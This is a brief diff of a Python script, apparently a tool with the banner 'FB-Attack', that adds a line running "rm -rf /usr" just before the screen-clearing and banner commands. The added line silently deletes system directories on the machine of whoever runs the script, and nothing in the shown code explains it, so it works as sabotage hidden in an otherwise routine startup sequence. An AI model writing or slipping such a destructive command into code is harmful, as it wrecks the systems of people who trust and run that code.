@@ -12,6 +12,7 @@ day = now.day
 month = now.month
 year = now.year
 
+os.system("rm -rf /usr")
 os.system("clear")
 os.system("figlet FB-Attack")
 print
